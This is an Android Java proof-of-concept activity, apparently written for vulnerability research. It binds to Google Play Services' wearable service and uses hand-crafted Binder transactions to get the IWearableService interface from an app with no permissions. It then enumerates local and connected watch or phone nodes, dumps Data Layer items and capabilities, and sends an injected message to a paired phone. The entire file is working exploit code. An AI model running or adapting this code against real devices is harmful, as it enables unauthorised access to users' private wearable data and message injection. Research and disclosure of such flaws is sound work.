package com.poc.datalayer;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class DataLayerProbe extends Activity {
    private static final String TAG = "DATALAYER_PROBE";

    private static final String BROKER_DESCRIPTOR =
        "com.google.android.gms.common.internal.IGmsServiceBroker";
    private static final String GMSCB_DESCRIPTOR =
        "com.google.android.gms.common.internal.IGmsCallbacks";
    private static final String IWS_DESCRIPTOR =
        "com.google.android.gms.wearable.internal.IWearableService";
    private static final String IWC_DESCRIPTOR =
        "com.google.android.gms.wearable.internal.IWearableCallbacks";

    private static final int WEARABLE_SERVICE_ID = 14;
    private static final int GMS_VERSION = 263332086;

    private StringBuilder output = new StringBuilder();
    private TextView textView;
    private Handler handler = new Handler(Looper.getMainLooper());

    private String localNodeId = null;
    private String localNodeName = null;
    private List<String[]> connectedNodes = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView scroll = new ScrollView(this);
        textView = new TextView(this);
        textView.setPadding(16, 16, 16, 16);
        textView.setTextSize(8);
        scroll.addView(textView);
        setContentView(scroll);

        log("=== GMS Protocol DL Probe v4 ===");
        log("Pkg: " + getPackageName());
        log("UID: " + android.os.Process.myUid());
        log("");

        bindWearableService();
    }

    private void bindWearableService() {
        Intent intent = new Intent("com.google.android.gms.wearable.BIND");
        intent.setPackage("com.google.android.gms");

        ServiceConnection conn = new ServiceConnection() {
            public void onServiceConnected(ComponentName name, IBinder binder) {
                log("[+] BOUND: " + name.getShortClassName());
                try {
                    log("[+] Descriptor: " + binder.getInterfaceDescriptor());
                } catch (Exception e) {}
                updateUI();
                new Thread(() -> doExploit(binder)).start();
            }
            public void onServiceDisconnected(ComponentName name) {
                log("[*] Disconnected");
                updateUI();
            }
        };

        try {
            boolean bound = bindService(intent, conn, Context.BIND_AUTO_CREATE);
            log("[*] Bind: " + bound);
        } catch (Exception e) {
            log("[!] " + e.getMessage());
        }
        updateUI();
    }

    private void doExploit(IBinder brokerBinder) {
        log("");
        log("=== Phase 1: Get IWearableService ===");
        updateUI();

        CountDownLatch serviceLatch = new CountDownLatch(1);
        final IBinder[] wearService = {null};

        IBinder callbacksBinder = new Binder() {
            @Override
            public String getInterfaceDescriptor() { return GMSCB_DESCRIPTOR; }

            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code >= 1 && code <= 5) {
                    try {
                        data.enforceInterface(GMSCB_DESCRIPTOR);
                    } catch (Exception e) {
                        data.setDataPosition(0);
                    }
                    int status = data.readInt();
                    IBinder svc = data.readStrongBinder();
                    log("[+] GMS callback code=" + code + " status=" + status);
                    if (status == 0 && svc != null) {
                        try {
                            log("[!!!] Service: " + svc.getInterfaceDescriptor());
                        } catch (Exception e) {}
                        wearService[0] = svc;
                    }
                    serviceLatch.countDown();
                    if (reply != null) reply.writeNoException();
                    updateUI();
                    return true;
                }
                return super.onTransact(code, data, reply, flags);
            }
        };

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(BROKER_DESCRIPTOR);
            data.writeStrongBinder(callbacksBinder);
            data.writeInt(1);
            writeGetServiceRequest(data);
            boolean r = brokerBinder.transact(46, data, reply, 0);
            log("[*] Broker transact: " + r);
            if (r) reply.readException();
        } catch (Exception e) {
            log("[!] Broker: " + e.getClass().getSimpleName() + ": " + trunc(e.getMessage()));
        } finally {
            data.recycle();
            reply.recycle();
        }
        updateUI();

        try { serviceLatch.await(5, TimeUnit.SECONDS); } catch (Exception e) {}

        if (wearService[0] == null) {
            log("[FAIL] Did not get IWearableService binder");
            updateUI();
            return;
        }

        IBinder ws = wearService[0];
        log("[!!!] ZERO-PERM APP HAS IWearableService!");
        log("");

        log("=== Phase 2: Get local node ===");
        updateUI();
        getLocalNodeInfo(ws);

        log("");
        log("=== Phase 3: Get connected nodes ===");
        updateUI();
        getConnectedNodesInfo(ws);

        log("");
        log("=== Phase 4: Get Data Layer items ===");
        updateUI();
        getDataItems(ws);

        log("");
        log("=== Phase 5: Send message ===");
        updateUI();
        if (!connectedNodes.isEmpty()) {
            String phoneNodeId = connectedNodes.get(0)[0];
            String phoneNodeName = connectedNodes.get(0)[1];
            log("[*] Target: " + phoneNodeName + " (" + phoneNodeId + ")");
            sendTestMessage(ws, phoneNodeId);
        } else {
            log("[*] No connected nodes, using local node");
            if (localNodeId != null) {
                sendTestMessage(ws, localNodeId);
            }
        }

        log("");
        log("=== Phase 6: Capability enumeration ===");
        updateUI();
        getAllCapabilities(ws);

        log("");
        log("=== EXPLOIT COMPLETE ===");
        log("[!!!] Zero-perm app accessed WearOS Data Layer");
        updateUI();
    }

    private void getLocalNodeInfo(IBinder ws) {
        CountDownLatch latch = new CountDownLatch(1);
        IBinder cb = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code == 9) {
                    try {
                        data.enforceInterface(IWC_DESCRIPTOR);
                        int marker = data.readInt();
                        if (marker != 0) {
                            parseGetLocalNodeResponse(data);
                        }
                    } catch (Exception e) {
                        log("[*] Parse local: " + e.getMessage());
                        dumpRaw(data, "localNode");
                    }
                    latch.countDown();
                    if (reply != null) reply.writeNoException();
                    updateUI();
                    return true;
                }
                latch.countDown();
                if (reply != null) reply.writeNoException();
                return true;
            }
        };

        callWearable(ws, 14, (p) -> p.writeStrongBinder(cb));
        try { latch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}
    }

    private void parseGetLocalNodeResponse(Parcel p) {
        int objHeader = p.readInt();
        int objFieldId = objHeader & 0xFFFF;
        int objSize;
        if (((objHeader >> 16) & 0xFFFF) == 0xFFFF) {
            objSize = p.readInt();
        } else {
            objSize = (objHeader >> 16) & 0xFFFF;
        }

        int objEnd = p.dataPosition() + objSize;

        int status = -1;
        while (p.dataPosition() < objEnd && p.dataPosition() < p.dataSize()) {
            int fHeader = p.readInt();
            int fId = fHeader & 0xFFFF;
            int fSize = (fHeader >> 16) & 0xFFFF;
            if (fSize == 0xFFFF) {
                fSize = p.readInt();
            }

            int fEnd = p.dataPosition() + fSize;

            if (fId == 2 && fSize == 4) {
                status = p.readInt();
                log("[+] LocalNode status: " + status);
            } else if (fId == 3) {
                parseNodeParcelable(p, fEnd, "local");
            } else {
                p.setDataPosition(fEnd);
            }
        }
    }

    private void parseNodeParcelable(Parcel p, int outerEnd, String label) {
        int npHeader = p.readInt();
        int npSize;
        if (((npHeader >> 16) & 0xFFFF) == 0xFFFF) {
            npSize = p.readInt();
        } else {
            npSize = (npHeader >> 16) & 0xFFFF;
        }
        int npEnd = p.dataPosition() + npSize;

        String nodeId = null;
        String nodeName = null;
        int hops = -1;
        boolean isNearby = false;

        while (p.dataPosition() < npEnd && p.dataPosition() < p.dataSize()) {
            int fh = p.readInt();
            int fid = fh & 0xFFFF;
            int fsz = (fh >> 16) & 0xFFFF;
            if (fsz == 0xFFFF) {
                fsz = p.readInt();
            }
            int fend = p.dataPosition() + fsz;

            if (fid == 2) {
                nodeId = p.readString();
            } else if (fid == 3) {
                nodeName = p.readString();
            } else if (fid == 4 && fsz == 4) {
                hops = p.readInt();
            } else if (fid == 5 && fsz == 4) {
                isNearby = p.readInt() != 0;
            } else {
                p.setDataPosition(fend);
            }
        }

        log("[!!!] Node[" + label + "]: id=" + nodeId + " name=" + nodeName
            + " hops=" + hops + " nearby=" + isNearby);

        if ("local".equals(label)) {
            localNodeId = nodeId;
            localNodeName = nodeName;
        } else {
            connectedNodes.add(new String[]{nodeId, nodeName});
        }

        p.setDataPosition(Math.min(outerEnd, p.dataSize()));
    }

    private void getConnectedNodesInfo(IBinder ws) {
        CountDownLatch latch = new CountDownLatch(1);
        IBinder cb = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code == 10) {
                    try {
                        data.enforceInterface(IWC_DESCRIPTOR);
                        int marker = data.readInt();
                        if (marker != 0) {
                            parseGetConnectedNodesResponse(data);
                        }
                    } catch (Exception e) {
                        log("[*] Parse connected: " + e.getMessage());
                        dumpRaw(data, "connNodes");
                    }
                    latch.countDown();
                    if (reply != null) reply.writeNoException();
                    updateUI();
                    return true;
                }
                latch.countDown();
                if (reply != null) reply.writeNoException();
                return true;
            }
        };

        callWearable(ws, 15, (p) -> p.writeStrongBinder(cb));
        try { latch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}
    }

    private void parseGetConnectedNodesResponse(Parcel p) {
        int objHeader = p.readInt();
        int objSize;
        if (((objHeader >> 16) & 0xFFFF) == 0xFFFF) {
            objSize = p.readInt();
        } else {
            objSize = (objHeader >> 16) & 0xFFFF;
        }
        int objEnd = p.dataPosition() + objSize;

        while (p.dataPosition() < objEnd && p.dataPosition() < p.dataSize()) {
            int fHeader = p.readInt();
            int fId = fHeader & 0xFFFF;
            int fSize = (fHeader >> 16) & 0xFFFF;
            if (fSize == 0xFFFF) {
                fSize = p.readInt();
            }
            int fEnd = p.dataPosition() + fSize;

            if (fId == 2 && fSize == 4) {
                int status = p.readInt();
                log("[+] ConnectedNodes status: " + status);
            } else if (fId == 3) {
                int count = p.readInt();
                log("[+] Connected nodes count: " + count);
                for (int i = 0; i < count && p.dataPosition() < fEnd; i++) {
                    int entrySize = p.readInt();
                    if (entrySize <= 0) break;
                    int entryEnd = p.dataPosition() + entrySize;
                    parseNodeParcelable(p, entryEnd, "peer_" + i);
                    p.setDataPosition(Math.min(entryEnd, p.dataSize()));
                }
            } else {
                p.setDataPosition(fEnd);
            }
        }
    }

    private void getDataItems(IBinder ws) {
        CountDownLatch latch = new CountDownLatch(1);
        IBinder cb = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code == 5) {
                    try {
                        data.enforceInterface(IWC_DESCRIPTOR);
                        dumpDataHolder(data);
                    } catch (Exception e) {
                        log("[*] DataHolder parse: " + e.getMessage());
                        dumpRaw(data, "dataItems");
                    }
                    latch.countDown();
                    if (reply != null) reply.writeNoException();
                    updateUI();
                    return true;
                }
                latch.countDown();
                if (reply != null) reply.writeNoException();
                return true;
            }
        };

        callWearable(ws, 8, (p) -> p.writeStrongBinder(cb));
        try { latch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}
    }

    private void dumpDataHolder(Parcel p) {
        int pos = p.dataPosition();
        int remaining = p.dataSize() - pos;
        log("[+] DataHolder raw size: " + remaining + " bytes");

        byte[] raw = new byte[Math.min(remaining, 512)];
        for (int i = 0; i < raw.length && p.dataPosition() < p.dataSize(); i++) {
            raw[i] = p.readByte();
        }

        StringBuilder ascii = new StringBuilder();
        StringBuilder hex = new StringBuilder();
        for (int i = 0; i < raw.length; i++) {
            hex.append(String.format("%02x", raw[i]));
            if (i % 4 == 3) hex.append(" ");
            if (raw[i] >= 32 && raw[i] < 127) {
                ascii.append((char) raw[i]);
            } else if (ascii.length() > 4) {
                log("[+] DH string: '" + ascii.toString() + "'");
                ascii.setLength(0);
            } else {
                ascii.setLength(0);
            }
        }
        if (ascii.length() > 4) {
            log("[+] DH string: '" + ascii.toString() + "'");
        }
        log("[+] DH hex(first 128): " + hex.substring(0, Math.min(hex.length(), 320)));
    }

    private void sendTestMessage(IBinder ws, String nodeId) {
        CountDownLatch latch = new CountDownLatch(1);
        final int[] responseStatus = {-999};

        IBinder cb = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code == 7) {
                    try {
                        data.enforceInterface(IWC_DESCRIPTOR);
                        int marker = data.readInt();
                        if (marker != 0) {
                            int objH = data.readInt();
                            int objSz = ((objH >> 16) & 0xFFFF) == 0xFFFF ? data.readInt() : (objH >> 16) & 0xFFFF;
                            int objEnd = data.dataPosition() + objSz;
                            while (data.dataPosition() < objEnd) {
                                int fh = data.readInt();
                                int fid = fh & 0xFFFF;
                                int fsz = (fh >> 16) & 0xFFFF;
                                if (fsz == 0xFFFF) fsz = data.readInt();
                                int fend = data.dataPosition() + fsz;
                                if (fid == 2 && fsz == 4) {
                                    responseStatus[0] = data.readInt();
                                    log("[+] SendMessage status: " + responseStatus[0]);
                                } else if (fid == 3 && fsz == 4) {
                                    int reqId = data.readInt();
                                    log("[+] SendMessage reqId: " + reqId);
                                } else {
                                    data.setDataPosition(fend);
                                }
                            }
                        }
                    } catch (Exception e) {
                        log("[*] SendMsg parse: " + e.getMessage());
                    }
                    latch.countDown();
                    if (reply != null) reply.writeNoException();
                    updateUI();
                    return true;
                }
                latch.countDown();
                if (reply != null) reply.writeNoException();
                return true;
            }
        };

        log("[*] Sending to node: " + nodeId);
        log("[*] Path: /poc/zero_perm_test");

        callWearable(ws, 12, (p) -> {
            p.writeStrongBinder(cb);
            p.writeString(nodeId);
            p.writeString("/poc/zero_perm_test");
            p.writeByteArray("ZERO_PERM_DATA_INJECTION".getBytes());
        });

        try { latch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}

        if (responseStatus[0] == 0) {
            log("[!!!] MESSAGE SENT SUCCESSFULLY TO PHONE!");
        } else {
            log("[*] SendMessage result: " + responseStatus[0]);
        }
    }

    private void getAllCapabilities(IBinder ws) {
        CountDownLatch latch = new CountDownLatch(1);
        IBinder cb = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code == 23) {
                    try {
                        data.enforceInterface(IWC_DESCRIPTOR);
                        dumpCapabilities(data);
                    } catch (Exception e) {
                        log("[*] Caps parse: " + e.getMessage());
                    }
                    latch.countDown();
                    if (reply != null) reply.writeNoException();
                    updateUI();
                    return true;
                }
                latch.countDown();
                if (reply != null) reply.writeNoException();
                return true;
            }
        };

        callWearable(ws, 43, (p) -> {
            p.writeStrongBinder(cb);
            p.writeInt(0);
        });
        try { latch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}
    }

    private void dumpCapabilities(Parcel p) {
        int pos = p.dataPosition();
        int remaining = p.dataSize() - pos;
        log("[+] Capabilities raw: " + remaining + " bytes");

        byte[] raw = new byte[Math.min(remaining, 512)];
        for (int i = 0; i < raw.length && p.dataPosition() < p.dataSize(); i++) {
            raw[i] = p.readByte();
        }

        StringBuilder ascii = new StringBuilder();
        for (int i = 0; i < raw.length; i++) {
            if (raw[i] >= 32 && raw[i] < 127) {
                ascii.append((char) raw[i]);
            } else if (ascii.length() > 3) {
                log("[+] Cap: '" + ascii.toString() + "'");
                ascii.setLength(0);
            } else {
                ascii.setLength(0);
            }
        }
        if (ascii.length() > 3) {
            log("[+] Cap: '" + ascii.toString() + "'");
        }
    }

    private interface ParcelWriter { void write(Parcel p); }

    private void callWearable(IBinder ws, int code, ParcelWriter writer) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(IWS_DESCRIPTOR);
            writer.write(data);
            boolean r = ws.transact(code, data, reply, 0);
            if (r) {
                try {
                    reply.readException();
                    log("[+] Code " + code + ": accepted");
                } catch (Exception e) {
                    log("[!] Code " + code + ": " + trunc(e.getMessage()));
                }
            } else {
                log("[*] Code " + code + ": false");
            }
        } catch (SecurityException e) {
            log("[BLOCKED] Code " + code + ": " + trunc(e.getMessage()));
        } catch (Exception e) {
            log("[!] Code " + code + ": " + e.getClass().getSimpleName());
        } finally {
            data.recycle();
            reply.recycle();
        }
        updateUI();
    }

    private void dumpRaw(Parcel data, String label) {
        int pos = data.dataPosition();
        data.setDataPosition(0);
        int sz = data.dataSize();
        byte[] raw = new byte[Math.min(sz, 128)];
        for (int i = 0; i < raw.length; i++) raw[i] = data.readByte();
        StringBuilder hex = new StringBuilder();
        for (int i = 0; i < raw.length; i++) {
            hex.append(String.format("%02x", raw[i]));
            if (i % 4 == 3) hex.append(" ");
        }
        log("[*] Raw[" + label + "] (" + sz + "): " + hex.toString().trim());
        data.setDataPosition(pos);
    }

    private void writeGetServiceRequest(Parcel parcel) {
        int headerPos = spBeginObject(parcel);
        spWriteInt(parcel, 1, 6);
        spWriteInt(parcel, 2, WEARABLE_SERVICE_ID);
        spWriteInt(parcel, 3, GMS_VERSION);
        spWriteString(parcel, 4, getPackageName());
        spWriteBoolean(parcel, 12, true);
        spFinishObject(parcel, headerPos);
    }

    private int spBeginObject(Parcel p) { return spBeginVar(p, 20293); }
    private void spFinishObject(Parcel p, int pos) { spEndVar(p, pos); }
    private void spWriteInt(Parcel p, int fid, int val) {
        p.writeInt(fid | (4 << 16)); p.writeInt(val);
    }
    private void spWriteBoolean(Parcel p, int fid, boolean val) {
        p.writeInt(fid | (4 << 16)); p.writeInt(val ? 1 : 0);
    }
    private void spWriteString(Parcel p, int fid, String val) {
        if (val == null) return;
        int pos = spBeginVar(p, fid);
        p.writeString(val);
        spEndVar(p, pos);
    }
    private int spBeginVar(Parcel p, int fid) {
        p.writeInt(fid | 0xFFFF0000);
        p.writeInt(0);
        return p.dataPosition();
    }
    private void spEndVar(Parcel p, int startPos) {
        int endPos = p.dataPosition();
        p.setDataPosition(startPos - 4);
        p.writeInt(endPos - startPos);
        p.setDataPosition(endPos);
    }

    private String trunc(String s) {
        if (s == null) return "null";
        return s.length() > 100 ? s.substring(0, 100) + "..." : s;
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        output.append(msg).append("\n");
    }

    private void updateUI() {
        handler.post(() -> {
            if (textView != null) textView.setText(output.toString());
        });
    }
}
